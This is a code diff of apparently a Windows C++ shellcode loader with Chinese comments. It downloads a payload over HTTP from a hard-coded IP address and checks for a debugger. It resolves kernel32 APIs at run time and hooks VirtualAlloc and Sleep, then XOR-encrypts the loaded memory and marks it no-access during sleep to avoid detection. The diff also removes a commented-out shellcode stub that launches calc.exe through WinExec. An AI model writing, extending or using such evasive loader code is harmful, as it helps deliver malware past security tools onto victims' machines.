@@ -30,11 +30,12 @@ char* http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
 "Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
 "User-Agent: moo1's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";
 // typedef 定义的
-typedef LPVOID(WINAPI* ReadProcessMemoryB)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
-typedef LPVOID(WINAPI* WriteProcessMemoryB)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
-typedef LPVOID(WINAPI* VirtualProtectB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+typedef BOOL(WINAPI* ReadProcessMemoryB)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
+typedef BOOL(WINAPI* WriteProcessMemoryB)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
+typedef BOOL(WINAPI* VirtualProtectB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 typedef LPVOID(WINAPI* VirtualAllocB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-
+typedef void(WINAPI* SleepB)(DWORD dwMilliseconds);
+typedef HANDLE(WINAPI* GetCurrentProcessB)();
 //#pragma comment(lib,"ws2_32.lib")
 BYTE virtualallocOriginalBytes[5] = { 0 };   //read the 5 byte
 BYTE sleepOriginalBytes[5] = { 0 };   //read the 5 byte
@@ -53,23 +54,11 @@ ReadProcessMemoryB ReadProcessMemorya;
 WriteProcessMemoryB WriteProcessMemorya;
 VirtualProtectB VirtualProtecta;
 VirtualAllocB VirtualAlloca;
+GetCurrentProcessB GetCurrentProcessa;
+SleepB sleepa;
 void HookVirtualAlloc();
 void HookSleep();
 #define PTCHAR char*
-char str_orign_byhuibian() {
-
-
-
-
-
-
-
-
-
-
-
-}
-
 
 
 // HttpReq.cpp : 定义控制台应用程序的入口点。
@@ -361,35 +350,7 @@ DWORD _getFunction_VirtualProtect(DWORD getproaddress, DWORD kernel32) {
 
 }
 
-/*
-_asm
-{
-Start:
-    push ebp
-        mov ebp, esp
-        sub esp, 0x12
-        call GetKernel32BaseAddr
-        mov dword[ebp - 4], eax; Kernel32.dll Base Addr
-        push eax
-        call GetProcAddrFuncAddr//获取getprocaddress函数地址
-        mov dword[ebp - 8], eax; GetProcAddress    //并把winexec字符串压栈后期调用getproaddress用以获取winexec地址
-        push 0x00636578; xec, 0x00
-        push 0x456e6957; WinE    //字符串用于传参
-        push esp
-        push dword[ebp - 4]; [ebp - 4] ->Kernel32.DLL Base Addr
-        call dword[ebp - 8]; [ebp - 8] ->GetProcAddress Addr
-        push 0; WinExec uCmdShow
-        push 0x6578652e; exe. : 6578652e
-        push 0x636c6163; clac: 636c6163
-        push esp
-        call eax    //调用winexec函数
-        nop
-        nop
-        add esp, 0x12
-        mov esp, ebp
-        pop ebp
-        ret
-}*/
+
 bool IsDebugged() {
     __try {
         __asm xor eax, eax;
@@ -455,7 +416,7 @@ void SetStrToMem(std::string str, char* mem)
 }
 void encrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
     BYTE* memory_value = new BYTE[size];
-    ReadProcessMemory(GetCurrentProcess(), address_main1, memory_value, size, NULL);  //获取全部内存
+    (*ReadProcessMemorya)((*GetCurrentProcessa)(), address_main1, memory_value, size, NULL);  //获取全部内存
     printf("address main is : %p\n",address_main1);
     //char* buffer = new char[size * 3];
     printf("\n---------origin---------\n");
@@ -468,7 +429,7 @@ void encrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
     for (size_t i = 0; i < size; i++) {
         memory_value[i] ^= key;
     }
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)address_main1, memory_value, size, NULL);
+    (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)address_main1, memory_value, size, NULL);
     printf("\n---------xor after---------\n");
     for (int i = 0; i < 100; i++)
     {
@@ -479,7 +440,7 @@ void encrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
 }
 void decrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
     BYTE* memory_value = new BYTE[size];
-    ReadProcessMemory(GetCurrentProcess(), address_main1, memory_value, size, NULL);  //获取全部内存
+    (*ReadProcessMemorya)((*GetCurrentProcessa)(), address_main1, memory_value, size, NULL);  //获取全部内存
     printf("address main is : %p\n", address_main1);
     printf("\n---------xor after---------\n");
     for (int i = 0; i < 10; i++)
@@ -490,7 +451,7 @@ void decrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
         memory_value[i] ^= key;
     }
     printf("\n--------origin----------\n");
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)address_main1, memory_value, size, NULL);
+    (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)address_main1, memory_value, size, NULL);
     for (int i = 0; i < 100; i++)
     {
         printf("%02X ", memory_value[i]);
@@ -500,7 +461,7 @@ void decrypt_memory(LPCVOID address_main1, size_t size, unsigned char key) {
 }
 LPVOID HookedVirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAlloctionType,DWORD flProtect) {
     // 解除挂钩VirtualAlloc  
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_virutalallc, virtualallocOriginalBytes, sizeof(virtualallocOriginalBytes), NULL);
+    (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)hookaddress_virutalallc, virtualallocOriginalBytes, sizeof(virtualallocOriginalBytes), NULL);
 
     // 调用原来的VirtualAlloc  
     LPVOID address = VirtualAlloc(lpAddress,dwSize,flAlloctionType,flProtect);
@@ -531,7 +492,7 @@ void HookVirtualAlloc() {
     // 保留Hook的前6个字节，解绑后需还原
     //LPCVOID hookaddress=NULL;
     
-    ReadProcessMemory(GetCurrentProcess(), hookaddress_virutalallc, virtualallocOriginalBytes, 5, NULL);
+    (*ReadProcessMemorya)((*GetCurrentProcessa)(), hookaddress_virutalallc, virtualallocOriginalBytes, 5, NULL);
     //DWORD error = GetLastError();
     //std::cerr << "Failed to read process memory. Error code: " << error << std::endl;
     // print the byte
@@ -549,7 +510,7 @@ void HookVirtualAlloc() {
     memcpy_s(patch + 1, 4, &offsetAddress, 4);
     printf("\nhookaddress:%p\n", hookaddress_virutalallc);
     // 将挂钩写入VirtualAllocc内存    
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_virutalallc, patch, sizeof(patch), NULL);
+    (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)hookaddress_virutalallc, patch, sizeof(patch), NULL);
 
     
 
@@ -571,17 +532,17 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
     PDWORD lpflOldProtect = NULL;
     // 加密新内存
     printf("address main memory:%p\n", address_main);
-    VirtualProtect(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
+    (*VirtualProtecta)(address_main, address_main_size, PAGE_READWRITE, lpflOldProtect);
     // 加密函数
     encrypt_memory(address_main, address_main_size, key);
-    VirtualProtect(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    (*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
     // 解除挂钩VirtualAlloc
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_sleep, sleepOriginalBytes, sizeof(sleepOriginalBytes), NULL);
-    Sleep(dwMilliseconds);
-    VirtualProtect(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)hookaddress_sleep, sleepOriginalBytes, sizeof(sleepOriginalBytes), NULL);
+    (*sleepa)(dwMilliseconds);
+    (*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
     // 解密函数
     decrypt_memory(address_main, address_main_size, key);
-    VirtualProtect(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
+    (*VirtualProtecta)(address_main, address_main_size, PAGE_NOACCESS, lpflOldProtect);
     // 重新挂钩
     HookSleep();
 
@@ -592,7 +553,7 @@ VOID WINAPI HookedSleep(DWORD dwMilliseconds) {
 void HookSleep() {
     SIZE_T bytesRead = 0;
     // 保留Hook的前5个字节，解绑后需还原
-    ReadProcessMemory(GetCurrentProcess(), hookaddress_sleep, sleepOriginalBytes, 5, &bytesRead);
+    (*ReadProcessMemorya)((*GetCurrentProcessa)(), hookaddress_sleep, sleepOriginalBytes, 5, &bytesRead);
     // 计算相对地址    
     //DWORD_PTR offsetAddress = (DWORD_PTR)HookedMessageBox - (DWORD_PTR)oldAddress - 5;
     //void* hookedAddress = HookedMessageBox;
@@ -609,7 +570,7 @@ void HookSleep() {
     DWORD dwOffeset = (DWORD_PTR)HookedSleep - (DWORD)hookaddress_sleep - 5;
     memcpy_s(patch + 1, 4, &dwOffeset, 4);
     // 将挂钩写入MessageBoxA内存    
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookaddress_sleep, patch, sizeof(patch), NULL);
+    (*WriteProcessMemorya)((*GetCurrentProcessa)(), (LPVOID)hookaddress_sleep, patch, sizeof(patch), NULL);
 
 }
 int main(int argc, CHAR* argv[]) {
@@ -617,7 +578,7 @@ int main(int argc, CHAR* argv[]) {
     //HWND hwndDOS = GetForegroundWindow();
     //ShowWindow(hwndDOS, SW_HIDE);
     HttpRequest httpReq("101.42.175.89", 65523);
-    std::string res = httpReq.HttpGet("/e");
+    std::string res = httpReq.HttpGet("/gh");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
 
@@ -692,9 +653,9 @@ int main(int argc, CHAR* argv[]) {
             WriteProcessMemorya = (WriteProcessMemoryB)_getFunction_WriteProcessMemory(process_address, kernel32_address);
             VirtualProtecta= (VirtualProtectB)_getFunction_VirtualProtect(process_address, kernel32_address);
             VirtualAlloca = (VirtualAllocB)_getFunction_virtualalloc(process_address, kernel32_address);
+            GetCurrentProcessa=(GetCurrentProcessB)_getFunction_GetCurrentProcess(process_address, kernel32_address);
             //VirtualAllocB p = (VirtualAllocB)_getFunction(process_address);  //这里会识别
-            typedef void(WINAPI* SleepB)(DWORD dwMilliseconds);
-            SleepB sleepa = (SleepB)_getFunction_sleep(process_address, kernel32_address);
+            sleepa = (SleepB)_getFunction_sleep(process_address, kernel32_address);
             printf("sleep address:%p\n", (LPVOID)sleepa);
             hookaddress_sleep = (LPVOID)sleepa;  //获取到sleep的地址
             HookSleep();
